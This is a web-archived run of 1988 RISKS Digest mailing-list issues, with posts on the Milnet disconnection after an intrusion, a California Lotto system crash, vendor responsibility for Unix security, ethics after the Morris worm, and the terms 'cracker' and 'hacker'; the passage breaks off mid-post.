</A>&gt;
</address>
<i>
Wed, 30 Nov 88 23:15:02 EST
</i><PRE>

&gt;    "Flexibility is software's strong suit, allowing the military
&gt;    to make changes in how a weapon system functions, even after
&gt;    it is fielded... [discussion of gratuitous changes deleted]
&gt;    ...making changes in a hurry during a conflict is imperative
&gt;    if software is to help US forces prevail."
&gt;     
&gt;    [...] But where is the US corp of software engineers that can fix
&gt;    a key software module quickly so the next airstrike can account for
&gt;    an unexpected SAM threat?  Do the armed services expect contractor
&gt;     personnel to volunteer for duty on the front lines?   ..... "
&gt;                                     Henry Spencer at U of Toronto Zoology
     
    Yes.  I have seen battlefield trucks from Viet Nam whose walls were full of
debugging notes.  Contractor personnel were assigned to debug the programs
during battle.

David L. Parnas, Queen's University, Kingston Ontario

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Telecommunications, Data Entry and Worker Exploitation
</A>
</H3>
<address>
Larry Hunter 
&lt;<A HREF="mailto:hunter-larry@YALE.ARPA">
hunter-larry@YALE.ARPA
</A>&gt;
</address>
<i>
Thu, 1 Dec 88 16:29:36 EST
</i><PRE>

From "Optical Information Systems Update," Dec 1, 1988, p.8.  

  Digiport, a new telecommunications facility in Jamaica, will open up
  a new era for data entry operations.  Two-way telecommunication
  eliminates one of the major problems of offshore data entry -- lengthly
  turnaround time.  Previously, at least three to four days were required
  just for round trip flights.  With image transmission, the data is
  quickly available for keying.  In addition to fast turnaround, two-way
  transmission provides complete document control and security because
  the forms never leave the customers office.  With this technology,
  the data entry function is electronically transferred to a low cost
  labor area with significant savings.  For information, contact ...
  Offshore Information Services, Inc., 39 North Broadway, Tarrrytown,
  NJ 10591....

And, of course, with a significant loss to data entry personnel in high cost
(like $6.00/hr) labor areas.  Not to mention the savings (losses) in reduced
requirements for worker benefits and safety standards.
                                                            Larry

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Milnet Isolation
</A>
</H3>
<address>
the terminal of Geoff Goodfellow 
&lt;<A HREF="mailto:Geoff@fernwood.mpk.ca.us">
Geoff@fernwood.mpk.ca.us
</A>&gt;
</address>
<i>
30 Nov 1988 17:29-PST
</i><PRE>

PENTAGON SEVERS MILITARY COMPUTER FROM NETWORK JAMMED BY VIRUS
By JOHN MARKOFF, c.1988 N.Y. Times News Service

	 NEW YORK _ The Pentagon said on Wednesday that it had temporarily
severed the connections between a nonclassifed military computer network and
the nationwide academic research and corporate computer network that was
jammed last month by a computer virus program.
	 Department of Defense officials said technical difficulties led to
the move. But several computer security experts said they had been told by
Pentagon officials that the decision to cut off the network was made after
an unknown intruder illegally gained entry recently to several computers
operated by the military and defense contractors.
	 Computer specialists said they thought that the Pentagon had broken
the connections while they tried to eliminate a security flaw in the
computers in the military network.
	 The Department of Defense apparently acted after a computer at the
Mitre Corp., a Bedford, Mass., company with several military contracts, was
illegally entered several times during the past month. Officials at several
universities in the United States and Canada said their computers had been
used by the intruder to reach the Mitre computer.
	 A spokeswoman for Mitre confirmed Wednesday that one of its
computers had been entered, but said no classified or sensitive information
had been handled by the computers involved. ``The problem was detected and
fixed within hours with no adverse consequences,'' Marcia Cohen said.
	 The military computer network, known as Milnet, connects hundreds
of computers run by the military and businesses around the country and is
linked through seven gateways to another larger computer network, Arpanet.
It was Arpanet that was jammed last month when Robert T. Morris, a Cornell
University graduate student, introduced a rogue program that jammed
computers on the network.
	 In a brief statement, a spokesman at the Defense Communication
Agency said the ties between Milnet and Arpanet, known as mail bridges, were
severed at 10 p.m. Monday and that the connections were expected to be
restored by Thursday.
	 ``The Defense Communications Agency is taking advantage of the loop
back to determine what the effects of disabling the mail bridges are,'' the
statement said. ``The Network Information Center is collecting user
statements and forwarding them to the Milnet manager.''
	 Several computer security experts said they had been told that the
network connection, which permits military and academic researchers to
exchange information, had been cut in response to the intruder. 
	 ``We tried to find out what was wrong (Tuesday) night after one of
our users complained that he could not send mail,'' said John Rochlis,
assistant network manager at the Massachusetts Institute of Technology.
``Inititally we were given the run around, but eventually they unofficially
confirmed to us that the shut-off was security related.''
	 Clifford Stoll, a computer security expert at Harvard University,
posted an electronic announcement on Arpanet Wednesday that Milnet was
apparently disconnected as a result of someone breaking into several
computers.
	 Several university officials said the intruder had shielded his
location by routing telephone calls from his computer through several
networks.
	 A manager at the Mathematics Faculty Computer Facility at the
University of Waterloo in Canada said officials there learned that one of
their computers had been illegally entered after receiving a call from
Mitre.
	 He said the attacker had reached the Waterloo computer from several
computers, including machines located at MIT, Stanford, the University of
Washington and the University of North Carolina. He said that the attacks
began on Nov. 3 and that some calls calls had been routed from England.
	 A spokeswoman for the Defense Communications Agency said that she
had no information about the break-in.
	 Stoll said the intruder used a well-known computer security flaw to
illegally enter the Milnet computers. The flaws are similar to those used by
Morris' rogue program.
	 It involves a utility program called ``file transfer protocol''
that is intended as a convenience to permit remote users to transfer data
files and programs over the network. The flaw is found in computers that run
the Unix operating system.
	 The decision to disconnect the military computers upset a number of
computer users around the country. Academic computer security experts
suggested that the military may have used the wrong tactic to attempt to
stop the illegal use of its machines.
	 ``There is a fair amount of grumbling going on,'' said Donald
Alvarez, an MIT astrophysicist. ``People think that this is an unreasonable
approach to be taking.''
	 He said that the shutting of the mail gateways did not cause the
disastrous computer shutdown that was created when the rogue program last
month stalled as many as 6,000 machines around the country.

       [By the way, things still do not appear to be back to normal. 
       Too bad.  That means MILNET hosts are not receiving RISKS, and
       also that I will have more headaches than usual with BARFMAIL.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.84.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.86.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-38</DOCNO>
<DOCOLDNO>IA012-000131-B035-345</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.86.html 128.240.150.127 19970217024223 text/html 17028
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:40:52 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 86</TITLE>
<LINK REL="Prev" HREF="/Risks/7.85.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.87.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.85.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.87.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 86</H1>
<H2> Saturday 3 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Mix-up Impedes Romance 
</A>
<DD>
<A HREF="#subj1.1">
Kevyn Collins-Thompson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  California Lotto computer crash 
</A>
<DD>
<A HREF="#subj2.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Telecommunications, Data Entry, ... - and "Security" 
</A>
<DD>
<A HREF="#subj3.1">
Henry Schaffer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Toll Road information collection 
</A>
<DD>
<A HREF="#subj4.1">
Dave Nedde
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Manufacturers' responsibilities for security 
</A>
<DD>
<A HREF="#subj5.1">
Keith Hanlan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Computer Malpractice 
</A>
<DD>
<A HREF="#subj6.1">
David J. Farber
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Interesting Sidebar on worm and liability 
</A>
<DD>
<A HREF="#subj7.1">
Charles J. Wertz
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Unfortunate Use of Term "cracker" 
</A>
<DD>
<A HREF="#subj8.1">
T. Andrews
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: "crackers" and "Crackers", " 'jackers", and "snackers" 
</A>
<DD>
<A HREF="#subj9.1">
PGN
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Mix-up Impedes Romance
</A>
</H3>
<address>
Kevyn Collins-Thompson 
&lt;<A HREF="mailto:kcollinsthom@lion.waterloo.edu">
kcollinsthom@lion.waterloo.edu
</A>&gt;
</address>
<i>
Fri, 2 Dec 88 12:02:38 EST
</i><PRE>

One day, after I logged in to my CMS account here, I discovered that new mail
was waiting for me in my reader.  The lengthy message was prefaced by the
heading:

     "From: Mailer@&lt;machine&gt;: Your message could not be sent ..etc"
     "Reason:  Address unknown..."

Upon scanning this returned letter, I discovered that it had not been
written by me at all, and that the intended recipient and sender were
thousands of miles away, apparently the unfortunate victims of a random 
mailer screw-up.  The first sentence of that letter, though, I will
always remember:

     "My dearest Janice:
      At last, we have a method of non-verbal communication which is
      completely private..."

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
California Lotto computer crash
</A>
</H3>
<address>
Hoffman.ElSegundo@Xerox.COM 
&lt;<A HREF="mailto:Rodney Hoffman">
Rodney Hoffman
</A>&gt;
</address>
<i>
2 Dec 88 07:47:47 PST (Friday)
</i><PRE>

From two stories by Dan Morain in the 'Los Angeles Times' on Tuesday, Nov.
29 and Thursday, Dec. 1:

  The California Lottery will fine GTECH Corp. $208,500 for a weekend computer
  crash that left two-thirds of the Lotto terminals in Southern California
  unable to accept wagers.  All 4,375 terminals in Southern California stopped
  working for 14 minutes in the peak betting period Saturday night.  Two-thirds
  of the terminals remained down for the rest of the night.
  
  A newly installed telecommunications program for the main Southern California
  lotto computer malfunctioned.  The problem was exacerbated by a GTECH
  operator who subsequently installed the wrong back-up program.  The new
  program was designed to improve system reliability.  It has been removed for
  testing.  "There's little doubt that the error was caused by GTECH software,
  compounded by GTECH operator error," said a senior vice president for the
  company.
  
  The state's contract with GTECH allows it to charge the company $4000 for
  each minute that the system is not working, and $1000 a minute when it is
  unacceptably slow.  Lottery officials say that in the last year, the computer
  system has been inoperable or unacceptably slow for 779 minutes, or 0.2% of
  the time.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Telecommunications, Data Entry, ... - and "Security"
</A>
</H3>
<address>
n c state univ
&lt;<A HREF="mailto:Henry Schaffer <hes@uncecs.edu>  ">
Henry Schaffer &lt;hes@uncecs.edu&gt;  
</A>&gt;
</address>
<i>
Fri, 2 Dec 88 15:39:08 est
</i><PRE>

Re: the quote from "Optical Information Systems Update," Dec 1, 1988, p.8.  

  ...  two-way transmission provides complete document control and security
  because the forms never leave the customer[']s office.  ...

Of course, if one is concerned about the security of the *information*,
that is a different matter.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Toll Road information collection
</A>
</H3>
<address>
Dave Nedde 
&lt;<A HREF="mailto:daven@weathertop.prime.com">
daven@weathertop.prime.com
</A>&gt;
</address>
<i>
Mon, 28 Nov 88 13:00:21 EST
</i><PRE>

&gt;From: oster@dewey.soe.Berkeley.EDU (David Phillip Oster)
&gt;Is it fair to also stamp the tickets with the time of issue, so if the
&gt;distance traveled divided by the time elapsed is greater than the average
&gt;speed limit the toll taker can hand you a speeding ticket at the same time?
&gt;An appropriate computer would help the toll taker in this task.

Alas, as a Mass police officer pointed out in an interview, you have to catch
someone *in the act* of speeding to get them for it.  Probably something to do
with that annoying bill of rights...

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Manufacturers' responsibilities for security  --
</A>
</H3>
<address>
Keith Hanlan
&lt;<A HREF="mailto:keithh%tartarus%bnr-fos@sri-unix.UUCP ">
keithh%tartarus%bnr-fos@sri-unix.UUCP 
</A>&gt;
</address>
<i>
Fri, 2 Dec 88 16:13:14 EST
</i><PRE>
         Vendors should provide proper tools for security

In RISKS 7.84, Brandon S. Allbery (allbery@ncoast.UUCP) explains that "Vendors
have some blame, but their [naive] customers and [ignorant] salespeople have
even more." This thesis is based on his observation and his experience that a
great many small-scale customers have no inclination to incur the overhead of a
'secure' system.

	From this, and the context of the article as a whole, I infer further,
that Mr. Allbery's feeling is that vendors are thus catering to a lowest
common denominator and, perhaps in keeping with the spirit of unix,
leaving the details and deficiencies to those with specific requirements.
I agree that this is most likely what has happened even though it is
not a publicly advertised tenet of any product developer.

	However, I feel that the vendors' laxities cannot be excused in
the least. In fact, as the professionals with an understanding of the 
implications of security, or lack thereof, it is incumbent on them to
produce a secure product which is still easy to install, maintain, and
use. Proper tools could reduce the confusion and inconvenience
which drives so many customers to take short-cuts. It would also 
enhance their product in all market areas.

	In the wake of the Internet Worm we have seen claims that UNIX is
intrinisically an insecure system and that this fact casts a pall on
UNIX's current rise in popularity. (I personally think the UNIX casts a
pall on computing as a whole but that is another issue. :-) ) However, 
I still maintain that proper maintenance tools will go a long way to 
producing secure computer networks.

	I have used several varieties of UNIX and the vendor's are always
very quick to advertise their value-added features and embellishments.
However, how often, when porting or re-writing an operating system, do
vendors take the opportunity to fix glaring bugs and deficiencies?
"Compatibility!" you cry? What bug cannot be made a option left to the
user's discretion? ("-B switch for historical reasons.")

	I hope this current wave of concern will encourage the vendors to
re-think their development strategies. Bug fixes are not that difficult.
It is time for the unix operating system developers to doff their
hacker's capes and stop reveling in the vagarities of Unix.

Keith Hanlan, Bell-Northern Research

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Computer Malpractice
</A>
</H3>
<address>
"David J. Farber" 
&lt;<A HREF="mailto:farber@dsl.cis.upenn.edu">
farber@dsl.cis.upenn.edu
</A>&gt;
</address>
<i>
Fri, 2 Dec 88 22:03:08 EST
</i><PRE>

The network worm (sometimes called virus) affair raises issues that are very
important to our field.  Both the BITNET Board of Trustees and the CSNET
Executive Committee have been struck by the fact that many public comments on
the event have contained statements such as, "We learned from it," "We will
make sure technically it will not happen again," or "He did us a favor by
showing...," unaccompanied by expressions of ethical concern.

We have succeeded as a profession technically in creating facilities -- the
BITNET, CSNET and other components of the national research network -- which
are now critical to the conduct of science and engineering in our nation's
academic, industrial, and government research laboratories.  Further, this
technology has spread within our nation's commercial research and development
organizations and even into their manufacturing and marketing.

Just as medical malpractice can have a serious effect on an individual's
health, one of the costs of our success is that we are now in a position where
misuse of our national and private computer networks can have as serious an
effect on the nation's economic, fense, and social health.  Yet while almost
every medical college has at least one course on medical ethics and insists on
the observance of ethical guidelines during practice, computer scientists seem
to avoid such non-scientific issues.

The worm "experiment" caused a major disruption in the research community.
Among other points of attack, the worm exploited a trapdoor that had been
distributed as a software "feature".  Many hours of talent were wasted finding
and curing the problems raised by this "game".  Many additional hours were lost
when researchers were unable to access supercomputers and mail systems due to
system overload and network shutdown.

We condemn the perpetration of such "experiments", "games", or "features" by
workers in our field, be they students, faculty, researchers or providers.  We
are especially worried about widespread tendencies to justify, ignore, or
perpetuate such breaches.  We must behave as do our fellow scientists who have
organized around comparable issues to enforce strong ethical practices in the
conduct of experiments.

We propose to join with the relevant professional societies and the national
research networks to form a Joint Ethics Committee charged with examining
existing statements of professional ethics and modifying them as necessary in
order to create a strong statement of networking ethics and recommendations for
appropriate enforcement procedures.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Interesting Sidebar on worm and liability
</A>
</H3>
<address>
&lt;<A HREF="mailto:<WERTZCJ@SNYBUFVA.BITNET>  Charles J. Wertz, Buffalo State College">
&lt;WERTZCJ@SNYBUFVA.BITNET&gt;  Charles J. Wertz, Buffalo State College
</A>&gt;
</address>
<i>
Sat, 3 Dec 88 09:12 EDT
</i><PRE>

Here is an extract of an interesting comment sent to BUG-LAN@SUVM
by magill@ENIAC.SEAS.UPENN.EDU (William Magill at Univ of Pa.)
  "..the reason that security policy procedures are important is an
  issue of LIABILITY."

  "The recent Internet worm was a case where KNOWN security holes
  were exploited. While what was done 'wasn't nice', it was
  indefensible from a point of view of liability. Put another way,
  had data been compromised, the fact that known security holes
  were not 'plugged' would have rendered the University/Hospital
  defenseless in a liability case."

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Unfortunate Use of Term "cracker" in <A HREF="/Risks/7.84.html">RISKS-7.84</A>
</A>
</H3>
<address>
&lt;<A HREF="mailto:tanner@ki4pv.UUCP">
tanner@ki4pv.UUCP
</A>&gt;
</address>
<i>
Thu Dec  1 20:56:25 1988
</i><PRE>

[<A HREF="/Risks/7.84.html">RISKS-7.84</A>] referred to the common practice among the semi-literate of
trusting to God that "crackers" will not invade or damage their new computer
systems.

As a native of God's Own Country, I must object to this use of the term
"cracker" to refer to computer vandals and burglars.  I suspect that our
neighbours to the north (also known as crackers) would also object.

        Dr. T. Andrews, Systems,	CompuData, Inc.  DeLand

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: "crackers" and "Crackers", " 'jackers", and "snackers"
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Sat, 3 Dec 1988 16:23:12 PST
</i><PRE>

With initial caps, "Cracker" (as used in Florida or Georgia) is a proper noun,
as opposed to "cracker" (as in the sense of a malevolent hacker).  But in 
Spoken English, the subtlety is certainly lost.

But we do have a problem.  We desperately need a convenient term like
"cracker", because the nonpejorative primary meaning of "hacker" needs to be
defended vigorously against misuse by the press and others.  Perhaps we could
try to use "jacker" (or " 'jacker", short for hijacker) as someone who breaks
into computer systems and subverts them.

How about "snacker" for someone who is a nonmalicious but exploratory
benevolent hacker?  When Bob Morris (the elder) was visiting Berkeley from Bell
Labs for the year (around 1967?), he might have been classified as a snacker:
he seemed to nibble at the edges of the Berkeley time-sharing system more than
anyone else.  In fact, whenever he walked into the terminal pool room, others
would log out -- because the system tended to crash more often when Bob was
logged in.  (He stumbled onto quite a bunch of hitherto undetected bugs.)
[Joe Bftsplk at Berkeley?]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.85.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.87.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-39</DOCNO>
<DOCOLDNO>IA012-000131-B035-372</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.87.html 128.240.150.127 19970217024237 text/html 29869
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:41:04 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 87</TITLE>
<LINK REL="Prev" HREF="/Risks/7.86.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.88.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.86.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.88.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 87</H1>
<H2> Monday 5 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Value for money? 
</A>
<DD>
<A HREF="#subj1.1">
Jerry Harper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Corps of Software Engineers 
</A>
<DD>
<A HREF="#subj2.1">
Gary Chapman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  DEC Enet and "denial of service" attacks 
</A>
<DD>
<A HREF="#subj3.1">
Willie Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Nonsecure passwords/computer ethics ( /dev/*mem and superuser )    
</A>
<DD>
<A HREF="#subj4.1">
Paul E. McKenney
</A><br>
<A HREF="#subj4.2">
 Kendall Collett
</A><br>
<A HREF="#subj4.3">
 PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  "Hackers,"  "crackers,"  "snackers,"  and ethics    
</A>
<DD>
<A HREF="#subj5.1">
Frank Maginnis
</A><br>
<A HREF="#subj5.2">
 PGN
</A><br>
<A HREF="#subj5.3">
 FM
</A><br>
<A HREF="#subj5.4">
 Darrell Long
</A><br>
<A HREF="#subj5.5">
 Alex Colvin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Computer Risks Revisited 
</A>
<DD>
<A HREF="#subj6.1">
John Markoff
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 Value for money?
</A>
</H3>
<address>
Jerry Harper 
&lt;<A HREF="mailto:jharper@euroies.UUCP">
jharper@euroies.UUCP
</A>&gt;
</address>
<i>
Sat, 3 Dec 88 20:42:33 GMT
</i><PRE>

This is excerpted from THE IRISH TIMES of two weeks back:

      " OFFICIALS `COMMITTED [$67m] TO INADEQUATE COMPUTERS' "

The Department of Health was accused yesterday of committing some [$67m] of
State funds to the purchase of an inadequate computer system for the health 
service.  Eleven million pounds will already have been spent on the project
by the end of this year, the Secretary of the Department of Health, Mr Liam
Flanagan, told the Dail [our parliament] Committee of Public Accounts.
...[the decision taken in 1982 to computerise government services... deleted]

   ...Auditor General,Mr Patrick McDonnell, expressed his disquiet at the
lack of planning since that date, and at the fact that no costing was done
until May 1985, by which time [$67m] was committed...
   ...[deleted piece about the authorship of a report]
   ...Mr Flanagan said [$670,000] had been spent on management consultancy.  In
his opinion, this was value for money, despite the fact that some of the
hardware proved to be inadequate with high maintenance costs, and certain items
had to be sold off at half-price to health boards.  In particular, the
committee heard that threee of the mini-computers which had cost approximately
[$227,000] were sold back to the supplier for [$123,000].  Two of these were
subsequently supplied to the Eastern Health Board at [$41,000] each.
   ...[deleted piece about the report being referred to the Minister]"
   The system being referred to was put together by McDonnell-Douglas and
"looked after" by the closely related McAuto.  An enormous amount of pressure
was placed on hospital administrators and senior consultants to accept the
system.  The pressure came from the company through the usual sales hype and
several politicians attempting to bend individuals ears.  A senior consultant I
know in one of the prestigious test site hospitals commented that he was
astounded at the inferiority of what was being offered.  It became so bad at
one stage that maintenance people were practically living in the hospital.  I
don't attribute culpability for the deficiencies of the system to any of the
companies involved but at the very least they should have beta-tested the
system more thoroughly.  The management consultancy firm could do with a little
of that also.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Corps of Software Engineers
</A>
</H3>
<address>
Gary Chapman
&lt;<A HREF="mailto:chapman@csli.Stanford.EDU ">
chapman@csli.Stanford.EDU 
</A>&gt;
</address>
<i>
Mon, 5 Dec 88 09:01:54 PST
</i><PRE>

Not exactly a risk of computers, but definitely a risk to software engineers:
during the early days of the war in Vietnam, there were some IBM programmers
and system engineers living in-country and working on Army computers.  One
day things got pretty hot--a rocket attack, I believe--and the IBM personnel
demanded to be evacuated.  The Army refused, saying they were essential to the
war effort, that without them the computers would not perform.  The IBM manager
threatened to go to superior authorities, so the Army commander then said that
the nearby airbase was under attack and there were no flights available for
evacuation.  I never heard the resolution of this story, but it was clear these
programmers got more than they bargained for.

For many years there was a "special" draft for doctors--physicians were almost
guaranteed two years of military service, simply because they were doctors.
Might we see something similar for computer professionals in the future?

-- Gary Chapman
   Executive Director, Computer Professionals for Social Reponsibility

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
DEC Enet and "denial of service" attacks
</A>
</H3>
<address>
Willie Smith, LTN Components Eng.
&lt;<A HREF="mailto:w_smith%wookie.DEC@decwrl.dec.com ">
w_smith%wookie.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
5 Dec 88 10:50
</i><PRE>

Over the five-day Thanksgiving weekend, the crackers of New England
successfully perpetrated a denial-of-service attack on Digital's internal
network.  They managed to do this without touching a keyboard.  Someone in
Corporate-level management decided that the following actions were to be
taken by all system managers:
 
The first was to shut down all the routers.  This prevented any network traffic
at all from travelling between different areas and broke the network into
independent LANs.  Essentially turning off the WAN....
 
The second step was to disable all dialins at all sites.  This prevented
hackers from gaining access to the machines in the first place.  This included
all external packet network hosts as well as local modems.
 
The third step was to shut down all "unattended" machines for the duration. 
This additional step prevented hackers from getting to the machines at all, and
greatly reduced the incidence of unauthorised use.  :+}
 
Well, to give them credit, it worked just fine!  It also caused a bit of havoc
in automatic distribution of Internet and Usenet postings, and gave those of us
who like to dial in to read our mail and internal BBSs the weekend off.  In
fact, it was so successful that there are rumblings that it may be repeated as
needed.  Most of our internal mailers time out after 3 days, and many are set
to one day to conserve disk space.  I've been told that the free access to the
